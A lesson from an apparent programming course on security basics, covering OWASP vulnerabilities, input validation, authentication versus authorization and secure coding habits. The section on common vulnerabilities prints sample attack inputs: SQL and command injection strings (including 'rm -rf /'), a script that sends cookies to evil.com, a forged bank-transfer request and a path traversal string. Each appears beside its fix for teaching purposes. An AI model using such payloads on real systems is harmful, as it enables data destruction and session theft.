[Previous](./[19]-Concurrency-Performance.md) | [Table of Contents](./[0]-Introduction.md) | [Next](./[21]-Deployment-DevOps-Basics.md)

# Lesson 20 - Security Basics

## 20.1 Common Vulnerabilities (Injection, XSS, etc.)

Understanding common vulnerability classes is the foundation of writing secure code — most real-world breaches exploit well-known, well-documented mistakes rather than exotic new attacks. The **OWASP Top 10** is the industry-standard reference for the most critical web application security risks.

### Injection Attacks

Occur when untrusted input is inserted into a command/query interpreter in a way that changes its intended meaning.

**SQL Injection (SQLi)** — malicious input alters a SQL query's structure.

```python
# VULNERABLE: user input concatenated directly into the query
query = f"SELECT * FROM users WHERE username = '{username}'"
# If username = "' OR '1'='1", the query becomes:
# SELECT * FROM users WHERE username = '' OR '1'='1'  → returns ALL users

# SAFE: parameterized query — the database treats input as data, not code
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**Command Injection** — untrusted input is passed to a system shell.
```python
# VULNERABLE
os.system(f"ping {user_input}")
# If user_input = "8.8.8.8; rm -rf /", the second command also executes

# SAFE: avoid shell=True, pass arguments as a list, validate input
subprocess.run(["ping", "-c", "4", user_input], shell=False)
```

**Other injection variants:** LDAP injection, XML/XXE injection, NoSQL injection (e.g., crafting a MongoDB query object instead of a string) — the underlying principle is the same: untrusted data is interpreted as code/structure instead of as inert data.

### Cross-Site Scripting (XSS)

Occurs when untrusted input is rendered in a web page without proper escaping, allowing an attacker to inject malicious JavaScript that executes in other users' browsers.

```html
<!-- VULNERABLE: user-supplied comment rendered directly as HTML -->
<div>Comment: {{ user_comment }}</div>
<!-- If user_comment = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>" -->
<!-- ...this script now runs in every visitor's browser, potentially stealing their session -->
```

**Types of XSS:**
- **Stored XSS** — malicious input is saved (e.g., in a database) and served to other users later (e.g., a malicious blog comment).
- **Reflected XSS** — malicious input is immediately reflected back in the response (e.g., via a crafted URL/search query), often used in phishing links.
- **DOM-based XSS** — the vulnerability exists entirely in client-side JavaScript that unsafely manipulates the page based on data from the URL or other sources, without ever touching the server.

**Prevention:** escape/encode output based on context (HTML, attribute, JavaScript, URL context all need different encoding), and use frameworks that auto-escape by default (most modern templating engines — React, Vue, Django templates — escape output unless explicitly told not to).

### Cross-Site Request Forgery (CSRF)

Tricks a logged-in user's browser into submitting an unwanted request to a site they're authenticated with, exploiting the fact that browsers automatically attach cookies to requests.

```html
<!-- Hosted on a malicious site; if the victim is logged into bank.com,
     their browser will include their bank.com cookies automatically -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**Prevention:** CSRF tokens (a unique, unpredictable value tied to the user's session, required on state-changing requests), the `SameSite` cookie attribute, and requiring re-authentication for sensitive actions.

### Broken Authentication & Session Management

Weaknesses in how a system verifies identity or manages logged-in sessions — weak password policies, session IDs that don't expire, predictable session tokens, or credentials transmitted/stored insecurely (see 20.3 for more).

### Insecure Deserialization

Occurs when an application deserializes untrusted data without validation, potentially allowing an attacker to construct malicious objects that execute code or manipulate application logic when deserialized. Particularly dangerous in languages/libraries where deserialization can trigger arbitrary code execution (e.g., unsafe use of Python's `pickle`, Java's native serialization).

### Security Misconfiguration

Broad category covering: default credentials left unchanged, unnecessary services/ports left open, overly verbose error messages that leak internal details (stack traces, file paths) to end users, missing security headers, and outdated software with known vulnerabilities.

### Sensitive Data Exposure

Storing or transmitting sensitive data (passwords, credit cards, personal data) without adequate protection — e.g., storing passwords in plain text, transmitting data over unencrypted HTTP, or logging sensitive information.

### Broken Access Control

Failing to properly restrict what authenticated users are allowed to do or see — e.g., a user can access another user's data simply by changing an ID in the URL (**Insecure Direct Object Reference / IDOR**).

```
GET /api/orders/1001   → belongs to the logged-in user (fine)
GET /api/orders/1002   → belongs to a DIFFERENT user
                        → if the server doesn't check ownership, this is a vulnerability
```

**Prevention:** always verify server-side that the authenticated user is authorized to access/modify the specific resource being requested — never rely solely on the difficulty of guessing an ID ("security through obscurity").

### Using Components with Known Vulnerabilities

Relying on outdated libraries/frameworks with publicly disclosed vulnerabilities (findable via tools like `npm audit`, `pip-audit`, Dependabot, or the CVE database) — a common and easily preventable attack vector.

---

## 20.2 Input Validation & Sanitization

Nearly every vulnerability class above stems from a single root problem: **trusting input that shouldn't be trusted**. Rigorous input handling is one of the highest-leverage security practices available.

### Validation vs. Sanitization

- **Validation** — checking that input conforms to expected rules (type, format, length, range) and **rejecting** it outright if it doesn't.
- **Sanitization** — modifying/cleaning input to make it safe to use (e.g., stripping disallowed characters, escaping special characters) rather than rejecting it.

Both have their place: validation is generally preferred where strict input format is expected (an email field, a numeric ID); sanitization is often used where free-form input is legitimately expected (rendering user-submitted rich text).

### Validation Principles

- **Allowlist over denylist** — define what's *permitted* and reject everything else, rather than trying to enumerate every possible malicious pattern (which is nearly impossible to do exhaustively). E.g., "only allow letters, digits, and hyphens" is far more robust than "block `<script>` tags."
```python
import re
def is_valid_username(username):
    return bool(re.fullmatch(r"[a-zA-Z0-9_-]{3,20}", username))
```
- **Validate on the server, always** — client-side validation is a UX convenience, not a security control, since it can trivially be bypassed (disabled JavaScript, direct API calls, browser dev tools). See Section 15.3.
- **Validate type, length, format, and range** — e.g., an "age" field should be an integer, within a sane range (0–150), not just "not empty."
- **Fail closed** — when validation logic is ambiguous or encounters an unexpected case, default to rejecting the input rather than allowing it through.

### Context-Aware Output Encoding (for XSS prevention)

Sanitizing *output* is just as important as validating input, and the correct encoding depends on *where* the data is being inserted:

| Context | Encoding Needed |
|---|---|
| HTML body | HTML entity encoding (`<` → `&lt;`) |
| HTML attribute | Attribute encoding |
| JavaScript string | JavaScript string escaping |
| URL parameter | URL encoding |
| SQL query | Parameterization (not string escaping — see below) |

Most modern frameworks handle this automatically for templated output — the key discipline is **not disabling that protection** (e.g., avoiding `dangerouslySetInnerHTML` in React, `{% autoescape off %}` in Django, or `v-html` in Vue, unless the content is fully trusted and necessary).

### Parameterized Queries (Not String Escaping) for SQL

The correct fix for SQL injection isn't "escape special characters" — it's **separating code from data entirely** using parameterized queries/prepared statements, where the database driver handles the distinction safely (see 20.1's example). ORMs (Object-Relational Mappers) generally handle this automatically, but raw string-built queries do not.

### File Upload Validation

A commonly overlooked input vector:
- Validate file **type** by content (magic bytes/MIME sniffing), not just the file extension (which is trivially spoofed).
- Enforce file **size limits** to prevent denial-of-service via huge uploads.
- Store uploaded files **outside the web root**, or serve them from a separate domain/subdomain with no execution permissions, so an uploaded malicious script can't be directly executed by the server.
- Rename uploaded files (avoid trusting user-supplied filenames directly, which can contain path traversal sequences like `../../etc/passwd`).

### Sanitizing Rich User Content

When users are legitimately allowed to submit formatted content (e.g., a comment system supporting basic HTML), use a well-vetted sanitization library (e.g., DOMPurify for HTML) with an **allowlist of safe tags/attributes**, rather than attempting to hand-write a filter — hand-rolled HTML sanitizers are notoriously easy to bypass.

### General Principle: Validate at Every Trust Boundary

Treat data as untrusted every time it crosses a boundary from a less-trusted context into a more-trusted one — not just at the initial entry point. Data coming from a database, another internal service, or a third-party API should still be handled carefully if it originated (even indirectly) from user input.

---

## 20.3 Authentication vs. Authorization

These two terms are often confused but address fundamentally different questions.

| | Authentication (AuthN) | Authorization (AuthZ) |
|---|---|---|
| Question answered | "Who are you?" | "What are you allowed to do?" |
| Happens | First — establishes identity | After authentication — checks permissions |
| Example | Logging in with a username/password | Checking whether this logged-in user can delete this specific post |

### Authentication

Verifying that a user is who they claim to be.

**Common authentication factors:**
- **Something you know** — a password, PIN, or security question.
- **Something you have** — a phone (SMS/authenticator app codes), a hardware security key, a smart card.
- **Something you are** — biometrics (fingerprint, face recognition).

**Multi-Factor Authentication (MFA)** combines two or more of these factors, dramatically reducing the risk of account compromise even if one factor (like a password) is stolen.

**Password storage — never store plain-text passwords.** Passwords should be **hashed** with a slow, purpose-built algorithm before storage:

```python
# Using a proper password hashing library (e.g., bcrypt)
import bcrypt

hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
# Store `hashed`, never the raw password

# Verifying a login attempt later
bcrypt.checkpw(entered_password.encode(), hashed)
```

- Use **bcrypt, scrypt, or Argon2** — algorithms specifically designed to be slow and resistant to brute-forcing (unlike fast general-purpose hashes like MD5 or SHA-256, which are unsuitable for password storage on their own).
- **Salting** — a unique random value added to each password before hashing, preventing attackers from using precomputed tables (rainbow tables) to reverse hashes in bulk. Modern libraries like bcrypt handle salting automatically.

**Session-based vs. token-based authentication:**
- **Session-based** — after login, the server creates a session and gives the client a session ID (usually via a cookie); the server looks up session state on each request.
- **Token-based (e.g., JWT)** — after login, the server issues a signed token containing identity claims; the client sends it with each request, and the server verifies the signature without needing to store session state (stateless).

**OAuth 2.0 / OpenID Connect** — standardized protocols for delegated authentication/authorization, commonly used for "Log in with Google/GitHub/etc." flows, where a trusted third party verifies identity so the application doesn't need to handle passwords directly.

### Authorization

Determining what an authenticated user is permitted to do or access.

**Common authorization models:**
- **Role-Based Access Control (RBAC)** — permissions are assigned to roles (e.g., "admin," "editor," "viewer"), and users are assigned one or more roles.
- **Attribute-Based Access Control (ABAC)** — access decisions are based on attributes of the user, resource, and context (e.g., "allow if the user's department matches the document's department AND it's during business hours").
- **Access Control Lists (ACLs)** — permissions are attached directly to individual resources, listing which users/roles can access them.

```python
def can_delete_post(user, post):
    return user.id == post.author_id or user.role == "admin"

# Always enforce this check server-side, on every request that touches the resource
if not can_delete_post(current_user, post):
    return HTTP_403_FORBIDDEN
```

**Principle of Least Privilege** — grant users (and services, and processes) only the minimum permissions necessary to perform their function, nothing more. Reduces the potential damage from a compromised account or a coding mistake.

### Common Mistakes That Blur the Two

- Confusing "the user is logged in" (authentication) with "the user is allowed to do this specific action" (authorization) — these are separate checks, and both are required.
- Performing authorization checks only in the UI (hiding a button) without enforcing them on the server — a user can still call the underlying API directly.
- Trusting client-supplied role/permission data instead of re-verifying it server-side on every request.

---

## 20.4 Secure Coding Habits

Security isn't a single feature bolted on at the end — it's a set of ongoing habits and defaults woven throughout development.

### Defense in Depth

Don't rely on a single security control. Layer multiple independent defenses so that if one fails, others still provide protection (e.g., input validation *and* parameterized queries *and* least-privilege database accounts, rather than relying on just one).

### Secure Defaults

Design systems so the *default* configuration is the secure one, requiring explicit action to loosen restrictions — rather than defaulting to permissive and requiring effort to lock down.

### Never Trust the Client

Any check, calculation, or restriction implemented only in client-side code (JavaScript, mobile app logic) can be bypassed. Treat client-side logic as a UX convenience; enforce all security-relevant rules server-side.

### Secrets Management

- **Never hardcode secrets** (API keys, database passwords, encryption keys) directly in source code — they end up in version control history permanently, even if later removed.
- Use **environment variables** or dedicated **secrets management tools** (e.g., AWS Secrets Manager, HashiCorp Vault, environment-specific `.env` files excluded from version control via `.gitignore`).
- **Rotate secrets periodically**, and immediately if a leak is suspected.
- Use different credentials per environment (development, staging, production) so a leaked development credential doesn't compromise production.

### Keep Dependencies Updated

Regularly update libraries and frameworks, and monitor for known vulnerabilities in dependencies using tools like `npm audit`, `pip-audit`, GitHub Dependabot, or Snyk. A huge share of real-world breaches exploit *known*, *already-patched* vulnerabilities in outdated dependencies.

### Principle of Least Privilege (Applied Broadly)

Extends beyond user permissions (20.3) to services, processes, and infrastructure: a web server process shouldn't run as root; a database user for an application should only have the specific permissions it actually needs (e.g., no `DROP TABLE` permission for a read-mostly service account).

### Don't Roll Your Own Cryptography

Cryptographic algorithms and protocols are extraordinarily easy to get subtly wrong in ways that aren't obvious until exploited. Use well-established, peer-reviewed libraries (e.g., `libsodium`, well-maintained TLS implementations) rather than inventing custom encryption/hashing schemes.

### Error Handling That Doesn't Leak Information

```python
# VULNERABLE: exposes internal details (stack trace, file paths, DB schema) to the user
try:
    result = db.query(sql)
except Exception as e:
    return f"Error: {e}"   # Might reveal table names, query structure, file paths

# SAFE: generic message to the user, full details logged internally for developers
try:
    result = db.query(sql)
except Exception as e:
    logger.error(f"Database query failed: {e}")   # detailed log, not user-facing
    return "Something went wrong. Please try again."
```

### Logging Securely

Never log sensitive data (passwords, full credit card numbers, session tokens, personal identifying information) — see Section 12.4. Logs are often less protected than the primary application and database, and are a common source of accidental data exposure.

### HTTPS Everywhere

Encrypt all data in transit, not just login pages — mixed HTTP/HTTPS content exposes cookies, tokens, and data to interception on any unencrypted request. Use HSTS (`Strict-Transport-Security` header) to instruct browsers to always use HTTPS for a domain.

### Rate Limiting and Throttling

Protect authentication endpoints, password reset flows, and public APIs from brute-force attacks and abuse by limiting the number of requests a client can make in a given time window.

### Threat Modeling (A Habit of Mind)

Before/while building a feature, briefly consider: *What could go wrong here? What would a malicious user try? What's the worst-case impact if this input/assumption is wrong?* This lightweight habit — thinking like an attacker for a moment — catches many issues far earlier and more cheaply than a post-deployment security audit.

### Security Code Review Checklist (Quick Reference)

- Is all user input validated server-side?
- Are database queries parameterized (never string-concatenated)?
- Is output properly encoded for its rendering context (HTML/JS/URL)?
- Are authentication and authorization checked separately, and both enforced server-side?
- Are secrets kept out of source code and version control?
- Are error messages generic to users, detailed only in internal logs?
- Are dependencies reasonably up to date, with no known critical vulnerabilities?
- Is sensitive data encrypted in transit (HTTPS) and at rest where appropriate?

### A Note on Learning More

Security is a deep, continuously evolving field. Resources like the **OWASP Top 10**, **OWASP Cheat Sheet Series**, and language/framework-specific security guides are excellent starting points for going beyond these fundamentals as needed for a specific project or role.

[Previous](./[19]-Concurrency-Performance.md) | [Table of Contents](./[0]-Introduction.md) | [Next](./[21]-Deployment-DevOps-Basics.md)
